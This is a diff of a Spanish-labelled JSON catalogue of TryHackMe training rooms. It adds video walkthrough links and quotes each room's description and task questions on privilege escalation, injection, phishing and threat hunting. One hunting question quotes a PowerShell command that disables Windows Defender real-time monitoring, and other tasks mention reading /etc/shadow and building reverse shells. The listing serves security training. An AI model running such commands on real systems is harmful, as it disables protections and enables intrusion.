reuse is a famously wide spread issue. There is also an SSH service active on the target Are any of the attached IDS able to detect the attack if the file /etc/shadow is requested via the exploit, if so what IDS detected it? Arbitrary file read exploits will often cause certain system file paths to appear in URLS and some IDS can detect this. What category does Wazuh place HTTP 400 error codes in? This info can be found in the alert breakdown and index page at MACHINE_IP:8000 Play around with some post-exploitation tools and commands and make note of what activity is detected by Wazuh; compare it to the activity that's detected by Suricata. What tool does linPEAS detect as having a potential escalation vector? You might want to pipe the result in to less so it's easier to read. Highly promising escalation vectors are highlighted with red and yellow Is an alert triggered by Wazuh when linPEAS is added to the system, if so what its severity? For this demo, Wazuh scans the file system every 60 seconds, so you might need to wait for a bit. Note, that by default it's 12 hours. Perform the privilege escalation and grab the flag in /root/ Abuse docker to establish a backdoor on the host system Read the above",
@@ -21749,6 +22403,12 @@
         "idioma": "EN",
         "formato": "Lab oficial",
         "url": "https://tryhackme.com/room/linuxprivesc"
+      },
+      {
+        "autor": "stuffy24",
+        "idioma": "EN",
+        "formato": "Vídeo",
+        "url": "https://youtu.be/cRLDmWWyblQ"
       }
     ],
     "skills": "Linux PrivEsc Practice your Linux Privilege Escalation skills on an intentionally misconfigured Debian VM with multiple ways to get root! SSH is available. Credentials: user:password321 Deploy the machine and login to the \"user\" account using SSH. Run the \"id\" command. What is the result? Read and follow along with the above. What is the root user's password hash? What hashing algorithm was used to produce the root user's password hash? john the ripper should automatically identify it when cracking! What is the root user's password? Read and follow along with the above. Run the \"id\" command as the newroot user. What is the result? How many programs is \"user\" allowed to run via sudo? One program on the list doesn't have a shell escape sequence on GTFOBins. Which is it? Consider how you might use this program with sudo to gain root privileges without a shell escape sequence. Play around with certain options the program has! Read and follow along with the above. Read and follow along with the above. What is the value of the PATH variable in /etc/crontab? Read and follow along with the above. Read and follow along with the above. Read and follow along with the above. Read and follow along with the above. Read and follow along with the above. Read and follow along with the above. What is the full mysql command the user executed? What file did you find the root user's credentials in? Read and follow along with the above. What is the name of the option that disables root squashing? Read and follow along with the above. Experiment with all three tools, running them with different options. Do all of them identify the techniques used in this room?",
@@ -22029,6 +22689,12 @@
         "idioma": "EN",
         "formato": "Lab oficial",
         "url": "https://tryhackme.com/room/lookingglass"
+      },
+      {
+        "autor": "JohnHammond",
+        "idioma": "EN",
+        "formato": "Vídeo",
+        "url": "https://youtu.be/Wqvy1qGOAVA"
       }
     ],
     "skills": "Looking Glass Step through the looking glass. A sequel to the Wonderland challenge room.",
@@ -22365,6 +23031,12 @@
         "idioma": "EN",
         "formato": "Lab oficial",
         "url": "https://tryhackme.com/room/misp"
+      },
+      {
+        "autor": "stuffy24",
+        "idioma": "EN",
+        "formato": "Vídeo",
+        "url": "https://youtu.be/obdafltUI_k"
       }
     ],
     "skills": "MISP Walkthrough on the use of MISP as a Threat Sharing Platform",
@@ -22393,6 +23065,12 @@
         "idioma": "EN",
         "formato": "Lab oficial",
         "url": "https://tryhackme.com/room/mitre"
+      },
+      {
+        "autor": "stuffy24",
+        "idioma": "EN",
+        "formato": "Vídeo",
+        "url": "https://youtu.be/44q34FOYR30"
       }
     ],
     "skills": "MITRE Explore the various resources that MITRE has made available to the cyber security community.",
@@ -22533,6 +23211,12 @@
         "idioma": "EN",
         "formato": "Lab oficial",
         "url": "https://tryhackme.com/room/mrrobot"
+      },
+      {
+        "autor": "stuffy24",
+        "idioma": "EN",
+        "formato": "Vídeo",
+        "url": "https://youtu.be/EQPfTiG24gk"
       }
     ],
     "skills": "Mr Robot CTF Based on the Mr. Robot show, can you root this box?",
@@ -22673,6 +23357,12 @@
         "idioma": "EN",
         "formato": "Lab oficial",
         "url": "https://tryhackme.com/room/netsecchallenge"
+      },
+      {
+        "autor": "stuffy24",
+        "idioma": "EN",
+        "formato": "Vídeo",
+        "url": "https://youtu.be/-zQFSpF5oP4"
       }
     ],
     "skills": "Net Sec Challenge Practice the skills you have learned in the Network Security module.",
@@ -22813,6 +23503,12 @@
         "idioma": "EN",
         "formato": "Lab oficial",
         "url": "https://tryhackme.com/room/nmap03"
+      },
+      {
+        "autor": "stuffy24",
+        "idioma": "EN",
+        "formato": "Vídeo",
+        "url": "https://youtu.be/r5nex1uRiZ8"
       }
     ],
     "skills": "Nmap Advanced Port Scans Learn advanced techniques such as null, FIN, Xmas, and idle (zombie) scans, spoofing, in addition to FW and IDS evasion.",
@@ -22841,6 +23537,12 @@
         "idioma": "EN",
         "formato": "Lab oficial",
         "url": "https://tryhackme.com/room/nmap01"
+      },
+      {
+        "autor": "stuffy24",
+        "idioma": "EN",
+        "formato": "Vídeo",
+        "url": "https://youtu.be/19F0QostRhU"
       }
     ],
     "skills": "Nmap Live Host Discovery Learn how to use Nmap to discover live hosts using ARP scan, ICMP scan, and TCP/UDP ping scan. Some of these questions will require the use of a static site to answer the task questions, while others require the use of the AttackBox. Send a packet with the following: From computer1 To computer1 (to indicate it is broadcast) Packet Type: “ARP Request” Data: computer6 (because we are asking for computer6 MAC address using ARP Request) How many devices can see the ARP Request? Do not count the switch when counting devices. Did computer6 receive the ARP Request? (Y/N) Send a packet with the following: From computer4 To computer4 (to indicate it is broadcast) Packet Type: “ARP Request” Data: computer6 (because we are asking for computer6 MAC address using ARP Request) How many devices can see the ARP Request? Do not count the switch when counting devices. Did computer6 reply to the ARP Request? (Yea/Nay) What is the first IP address Nmap would scan if you provided 10.10.12.13/29 as your target? Run nmap -sL -n 10.10.12.13/29. How many IP addresses will Nmap scan if you provide the following range 10.10.0-255.101-125 ? Run nmap -sL -n 10.10.0-255.101-125. Send a packet with the following: From computer1 To computer3 Packet Type: “ Ping Request ” What type of packet did computer1 send before the ping? What type of packet did computer1 receive before it was able to send the ping? How many computers responded to the ping request? Send a packet with the following: From computer2 To computer5 Packet Type: “ Ping Request ” What is the name of the first device that responded to the first ARP Request? What is the name of the first device that responded to the second ARP Request? Send another Ping Request. Did it require new ARP Requests? (yea/nay) We will be sending broadcast ARP Request packets with the following options: From computer1 To computer1 (to indicate it is broadcast) Packet Type: “ARP Request” Data: try all 8 devices (other than computer1) on the network: computer2 , computer3 , computer4 , computer5 , computer6 , switch1 , switch2 , and router. How many devices can you discover using ARP requests? What is the option required to tell Nmap to use ICMP Timestamp to discover live hosts? What is the option required to tell Nmap to use ICMP Address Mask to discover live hosts? What is the option required to tell Nmap to use ICMP Echo to discover live hosts? Which TCP ping scan does not require a privileged account? Which TCP ping scan requires a privileged account? What option do you need to add to Nmap to run a TCP SYN ping scan on the telnet port? Telnet uses port 23 We want Nmap to issue a reverse DNS lookup for all the possibles hosts on a subnet, hoping to get some insights from the names. What option should we add? Ensure you have taken note of all the Nmap options explained in this room. To continue learning about Nmap, please join the room Nmap Basic Port Scans , which introduces the basic types of port scans.",
@@ -23149,6 +23851,12 @@
         "idioma": "EN",
         "formato": "Lab oficial",
         "url": "https://tryhackme.com/room/opencti"
+      },
+      {
+        "autor": "stuffy24",
+        "idioma": "EN",
+        "formato": "Vídeo",
+        "url": "https://youtu.be/qgqtFoyLLUo"
       }
     ],
     "skills": "OpenCTI Provide an understanding of the OpenCTI Project",
@@ -23177,6 +23885,12 @@
         "idioma": "EN",
         "formato": "Lab oficial",
         "url": "https://tryhackme.com/room/orminjection"
+      },
+      {
+        "autor": "stuffy24",
+        "idioma": "EN",
+        "formato": "Vídeo",
+        "url": "https://youtu.be/UOvy5AAnGUo"
       }
     ],
     "skills": "ORM Injection Learn how to exploit injection vulnerabilities in an ORM-based web app.",
@@ -23233,6 +23947,12 @@
         "idioma": "EN",
         "formato": "Lab oficial",
         "url": "https://tryhackme.com/room/owaspapisecuritytop105w"
+      },
+      {
+        "autor": "stuffy24",
+        "idioma": "EN",
+        "formato": "Vídeo",
+        "url": "https://youtu.be/d-3z_9Vx4e0"
       }
     ],
     "skills": "OWASP API Security Top 10 - 1 Learn the basic concepts for secure API development (Part 1).",
@@ -23429,6 +24149,24 @@
         "idioma": "EN",
         "formato": "Lab oficial",
         "url": "https://tryhackme.com/room/phishingyl"
+      },
+      {
+        "autor": "stuffy24",
+        "idioma": "EN",
+        "formato": "Vídeo",
+        "url": "https://youtu.be/p7ogQaVC0Og"
+      },
+      {
+        "autor": "stuffy24",
+        "idioma": "EN",
+        "formato": "Vídeo",
+        "url": "https://youtu.be/MSQRD8VVKSg"
+      },
+      {
+        "autor": "stuffy24",
+        "idioma": "EN",
+        "formato": "Vídeo",
+        "url": "https://youtu.be/BB5mz338huk"
       }
     ],
     "skills": "Phishing Learn what phishing is and why it's important to a red team engagement. You will set up phishing infrastructure, write a convincing phishing email and try to trick your target into opening your email in a real-world simulation.",
@@ -23513,6 +24251,12 @@
         "idioma": "EN",
         "formato": "Lab oficial",
         "url": "https://tryhackme.com/room/preparation"
+      },
+      {
+        "autor": "stuffy24",
+        "idioma": "EN",
+        "formato": "Vídeo",
+        "url": "https://youtu.be/aQvS10kOKrY"
       }
     ],
     "skills": "Preparation A look into the Preparation phase of the Incident Response.",
@@ -23653,6 +24397,12 @@
         "idioma": "EN",
         "formato": "Lab oficial",
         "url": "https://tryhackme.com/room/protocolsandservers2"
+      },
+      {
+        "autor": "stuffy24",
+        "idioma": "EN",
+        "formato": "Vídeo",
+        "url": "https://youtu.be/nD5-78vboqU"
       }
     ],
     "skills": "Protocols and Servers 2 Learn about attacks against passwords and cleartext traffic; explore options for mitigation via SSH and SSL/TLS.",
@@ -23989,6 +24739,12 @@
         "idioma": "EN",
         "formato": "Lab oficial",
         "url": "https://tryhackme.com/room/opsec"
+      },
+      {
+        "autor": "stuffy24",
+        "idioma": "EN",
+        "formato": "Vídeo",
+        "url": "https://youtu.be/HotPAT_DtcA"
       }
     ],
     "skills": "Red Team OPSEC Learn how to apply Operations Security (OPSEC) process for Red Teams.",
@@ -24017,6 +24773,12 @@
         "idioma": "EN",
         "formato": "Lab oficial",
         "url": "https://tryhackme.com/room/redteamthreatintel"
+      },
+      {
+        "autor": "stuffy24",
+        "idioma": "EN",
+        "formato": "Vídeo",
+        "url": "https://youtu.be/3idGLAyM1Tc"
       }
     ],
     "skills": "Red Team Threat Intel Apply threat intelligence to red team engagements and adversary emulation. Read the above and continue to the next task. Read the above and continue to the next task. Read the above and continue to the next task. Read the above and continue to the next task. Read the above and use MITRE ATT&CK Navigator to answer the questions below using a Carbanak layer. How many Command and Control techniques are employed by Carbanak? https://mitre-attack.github.io/attack-navigator//#layerURL=https://attack.mitre.org/groups/G0008/G0008-enterprise-layer.json What signed binary did Carbanak use for defense evasion? \"Defense Evasion\" tactic What Initial Access technique is employed by Carbanak? \"Initial Access\" tactic Read the above and continue to the next task. Open the provided ATT&CK Navigator layer and identify matched TTPs to the cyber kill chain. Once TTPs are identified, map them to the cyber kill chain in the static site. To complete the challenge, you must submit one technique name per kill chain section. Once the chain is complete and you have received the flag, submit it below. PowerShell, Spearphishing Attachment, External Remote Services, BITS Jobs, DNS, Keylogging Answer questions below relating to needed engagement resources. What web shell is APT 41 known to use? What LOLBAS ( L iving O ff T he L and B inaries and S cripts) tool does APT 41 use to aid in file transfers? What tool does APT 41 use to mine and monitor SMS traffic? Read the above and continue learning!",
@@ -24101,6 +24863,12 @@
         "idioma": "EN",
         "formato": "Lab oficial",
         "url": "https://tryhackme.com/room/relevant"
+      },
+      {
+        "autor": "stuffy24",
+        "idioma": "EN",
+        "formato": "Vídeo",
+        "url": "https://youtu.be/gvkILIRWhDU"
       }
     ],
     "skills": "Relevant Penetration Testing Challenge User Flag Root Flag",
@@ -24493,6 +25261,12 @@
         "idioma": "EN",
         "formato": "Lab oficial",
         "url": "https://tryhackme.com/room/serversidetemplateinjection"
+      },
+      {
+        "autor": "JohnHammond",
+        "idioma": "EN",
+        "formato": "Vídeo",
+        "url": "https://youtu.be/FwTH0zDiLxM"
       }
     ],
     "skills": "Server-side Template Injection Exploit various templating engines that lead to SSTI vulnerability.",
@@ -24661,6 +25435,12 @@
         "idioma": "EN",
         "formato": "Lab oficial",
         "url": "https://tryhackme.com/room/snort"
+      },
+      {
+        "autor": "stuffy24",
+        "idioma": "EN",
+        "formato": "Vídeo",
+        "url": "https://youtu.be/lBH6T9GhPos"
       }
     ],
     "skills": "Snort Learn how to use Snort to detect real-time threats, analyse recorded traffic files and identify anomalies.",
@@ -24717,6 +25497,12 @@
         "idioma": "EN",
         "formato": "Lab oficial",
         "url": "https://tryhackme.com/room/snortchallenges1"
+      },
+      {
+        "autor": "stuffy24",
+        "idioma": "EN",
+        "formato": "Vídeo",
+        "url": "https://youtu.be/0Ac-1Djv14s"
       }
     ],
     "skills": "Snort Challenge - The Basics Put your snort skills into practice and write snort rules to analyse live capture network traffic.",
@@ -24969,6 +25755,18 @@
         "idioma": "EN",
         "formato": "Lab oficial",
         "url": "https://tryhackme.com/room/sqlinjectionlm"
+      },
+      {
+        "autor": "stuffy24",
+        "idioma": "EN",
+        "formato": "Vídeo",
+        "url": "https://youtu.be/G18iYMgi13g"
+      },
+      {
+        "autor": "stuffy24",
+        "idioma": "EN",
+        "formato": "Vídeo",
+        "url": "https://youtu.be/8b9TOAoDHpk"
       }
     ],
     "skills": "SQL Injection Learn how to detect and exploit SQL Injection vulnerabilities What does SQL stand for? What is the acronym for the software that controls a database? What is the name of the grid-like structure which holds the data? What SQL statement is used to retrieve data? What SQL clause can be used to retrieve data from multiple tables? What SQL statement is used to add data? What character signifies the end of an SQL query? What is the flag after completing level 1? What is the flag after completing level two? (and moving to level 3) What is the flag after completing level three? What is the final flag after completing level four? Name a protocol beginning with D that can be used to exfiltrate data from a database. Name a method of protecting yourself from an SQL Injection exploit. Pxxxxxxx Sxxxxxxxxx",
@@ -25025,6 +25823,12 @@
         "idioma": "EN",
         "formato": "Lab oficial",
         "url": "https://tryhackme.com/room/ssrfhr"
+      },
+      {
+        "autor": "stuffy24",
+        "idioma": "EN",
+        "formato": "Vídeo",
+        "url": "https://youtu.be/iLzHUbN4Xiw"
       }
     ],
     "skills": "SSRF Discover the inner workings of SSRF and explore multiple exploitation techniques. I can access the HRMS website. What is the average weighted impact for the SSRF vulnerability as per the OWASP Top 10? What is the username for the HRMS login panel? What is the password for the HRMS login panel? What is the admin URL as per the config file? What is the flag value after successfully logging in to the HRMS web panel? Is accessing non-routable addresses possible if a server is vulnerable to SSRF (yea/nay)? What is the flag value after accessing the admin panel? Does Out-of-band SSRF always include a technique in which an attacker always receives direct responses from the server (yea/nay)? What is the value for Virtual Directory Support on the PHP server per the logged data? What is the value of the PHP Extension Build on the server? Which type of SSRF doesn't give us a direct response or feedback? What is the flag value after loading a big image exceeding 100KB? Which of the following is the suggested approach while handling trusted URLs? Write the correct option only. a) Filter out disallowed URLs b) Maintaining an allowlist of trusted URLs Since SSRF mainly exploits server-side requests, is it optional to sanitise the input URLs or parameters (yea/nay)? I have completed the room.",
@@ -25641,6 +26445,12 @@
         "idioma": "EN",
         "formato": "Lab oficial",
         "url": "https://tryhackme.com/room/threathuntingendgame"
+      },
+      {
+        "autor": "stuffy24",
+        "idioma": "EN",
+        "formato": "Vídeo",
+        "url": "https://youtu.be/Kak8rwwOi9w"
       }
     ],
     "skills": "Threat Hunting: Endgame Learn how to hunt and discover suspicious activities indicating actions on objectives.",
@@ -25669,6 +26479,12 @@
         "idioma": "EN",
         "formato": "Lab oficial",
         "url": "https://tryhackme.com/room/threathuntingfoothold"
+      },
+      {
+        "autor": "stuffy24",
+        "idioma": "EN",
+        "formato": "Vídeo",
+        "url": "https://youtu.be/cdr_EcuHUSU"
       }
     ],
     "skills": "Threat Hunting: Foothold Hunting suspicious activities indicating initial user or host compromise. I have started the VM and am now ready to hunt! Use the Discover tab on the left sidebar (via the hamburger button) to answer the question. What is the attacker's successful authentication timestamp on the Jumphost server? Format: MMM d, yyyy @ HH:mm:ss.SSS (Don't forget the milliseconds) Example: Nov 1, 2018 @ 13:45:00.000 You may use the same query discussed on the successful SSH authentication section, on the Discover tab. What is the name of the PHP file accessed by the attacker via the cat command after gaining successful code execution on web01? What is the name of the unusual process executed within the timeframe of update.lnk execution on WKSTN-2? Explore the surrounding documents from the update.lnk log. Tracing back the cmd and PowerShell child processes spawned by installer.exe, what is the first command executed via cmd? You may use the process.parent.command_line field in a KQL query to focus on the child processes spawned by installer.exe. Using the process ID of the PowerShell process spawned by mshta.exe, what is the destination IP of the network connections made by this process? Identify first the process ID and use it with winlog.event_id for network connections made. Following the cmd.exe process spawned by Python, what is the command-line value of the net.exe process? What is the PID of the cmd.exe process that executed \"powershell Set-MpPreference -DisableRealtimeMonitoring $true\"? What is the PowerShell command-line argument used to clear the event logs of WKSTN-1? What is the process PID of chrome.exe's target for process injection? The winlog.event_data field contains significant information regarding this event. What is the name of the parent process of the cmd.exe process that executed the scheduled task creation? Using the process ID of malicious reg.exe execution, what is the value of the process command line used to execute the registry modification? Use the process ID (process.pid field) to see the process creation event and its command line execution. What is the link downloaded using PowerShell to establish the C2 over DNS? Find the parent process of nslookup.exe to discover the powershell command executed. After investigating C2 over Discord events, what command is used to download the malicious dev.py python script? What is the name of the process that is also associated with cdn[.]golge[.]xyz? Did you enjoy the hunt?",
@@ -25697,6 +26513,12 @@
         "idioma": "EN",
         "formato": "Lab oficial",
         "url": "https://tryhackme.com/room/threathuntingpivoting"
+      },
+      {
+        "autor": "stuffy24",
+        "idioma": "EN",
+        "formato": "Vídeo",
+        "url": "https://youtu.be/ANDvrRZ8G0A"
       }
     ],
     "skills": "Threat Hunting: Pivoting Hunting suspicious activities indicating threat propagation across the infrastructure.",
@@ -26453,6 +27275,12 @@
         "idioma": "EN",
         "formato": "Lab oficial",
         "url": "https://tryhackme.com/room/weaponization"
+      },
+      {
+        "autor": "stuffy24",
+        "idioma": "EN",
+        "formato": "Vídeo",
+        "url": "https://youtu.be/46-mRO0yVCU"
       }
     ],
     "skills": "Weaponization  Understand and explore common red teaming weaponization techniques. You will learn to build custom payloads using common methods seen in the industry to get initial access.",
@@ -26677,6 +27505,12 @@
         "idioma": "EN",
         "formato": "Lab oficial",
         "url": "https://tryhackme.com/room/windowseventlogs"
+      },
+      {
+        "autor": "stuffy24",
+        "idioma": "EN",
+        "formato": "Vídeo",
+        "url": "https://youtu.be/6GdX55-Gxpo"
       }
     ],
     "skills": "Windows Event Logs Introduction to Windows Event Logs and the tools to query them.",
@@ -26929,6 +27763,12 @@
         "idioma": "EN",
         "formato": "Lab oficial",
         "url": "https://tryhackme.com/room/windows10privesc"
+      },
+      {
+        "autor": "stuffy24",
+        "idioma": "EN",
+        "formato": "Vídeo",
+        "url": "https://youtu.be/s_a3UxA6OFY"
       }
     ],
     "skills": "Windows PrivEsc Practice your Windows Privilege Escalation skills on an intentionally misconfigured Windows VM with multiple ways to get admin/SYSTEM! RDP is available. Credentials: user:password321 Deploy the Windows VM and login using the \"user\" account. Generate a reverse shell executable and transfer it to the Windows VM. Check that it works! What is the original BINARY_PATH_NAME of the daclsvc service? What is the BINARY_PATH_NAME of the unquotedsvc service? Read and follow along with the above. Read and follow along with the above. Read and follow along with the above. Read and follow along with the above. What was the admin password you found in the registry? Read and follow along with the above. What is the NTLM hash of the admin user? The hashdump includes the LM and NTLM hashes. The NTLM hash is the second one! Read and follow along with the above. Read and follow along with the above. Read and follow along with the above. Read and follow along with the above. Name one user privilege that allows this exploit to work. Read up on the exploit on Google! This privilege relates to impersonation. Name the other user privilege that allows this exploit to work. Read up on the exploit on Google! This privilege relations to tokens. Read and follow along with the above. Experiment with all four tools, running them with different options. Do all of them identify the techniques used in this room?",
@@ -26985,6 +27825,18 @@
         "idioma": "EN",
         "formato": "Lab oficial",
         "url": "https://tryhackme.com/room/windowsprivesc20"
+      },
+      {
+        "autor": "stuffy24",
+        "idioma": "EN",
+        "formato": "Vídeo",
+        "url": "https://youtu.be/GjRs_z_xiz8"
+      },
+      {
+        "autor": "stuffy24",
+        "idioma": "EN",
+        "formato": "Vídeo",
+        "url": "https://youtu.be/u-fBE0NZZsU"
       }
     ],
     "skills": "Windows Privilege Escalation Learn the fundamentals of Windows privilege escalation techniques.",
@@ -27237,6 +28089,12 @@
         "idioma": "EN",
         "formato": "Lab oficial",
         "url": "https://tryhackme.com/room/wonderland"
+      },
+      {
+        "autor": "stuffy24",
+        "idioma": "EN",
+        "formato": "Vídeo",
+        "url": "https://youtu.be/ZsjYv0VRKfk"
       }
     ],
     "skills": "Wonderland Fall down the rabbit hole and enter wonderland. Obtain the flag in user.txt Everything is upside down here. Escalate your privileges, what is the flag in root.txt?",
